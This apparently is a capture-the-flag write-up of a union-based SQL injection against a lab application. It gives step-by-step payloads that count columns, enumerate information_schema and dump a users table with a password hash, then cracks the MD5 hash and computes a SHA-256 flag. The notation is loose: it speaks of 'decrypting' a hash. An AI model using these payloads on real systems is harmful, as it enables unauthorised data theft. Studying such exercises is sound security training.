### Step 1: Identify the number of columns required for the request

```sql
1 OR 1=1 UNION SELECT NULL, NULL--
```

> Result: `2 columns`

---

### Step 2: Retrieve the column names from the `users` table

```sql
1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
```

> Columns found: `user_id, first_name, last_name, town, country, planet, Commentaire, countersign`

---

### Step 3: View all the data for users

```sql
1 AND 1=2 UNION SELECT user_id, CONCAT(first_name, last_name, town, country, planet, Commentaire, countersign) FROM users
```

> Example output:
> `user_id = 5`
> `FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28`

---

### Step 4: Process the password

```python
md5_decrypt('5ff9d0165b4f92b14994e5c685cdce28')
```

> Output: `FortyTwo`

```sql
lower('FortyTwo')
```

> Output: `fortytwo`

```sql
sh256('fortytwo')
```

> Output: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
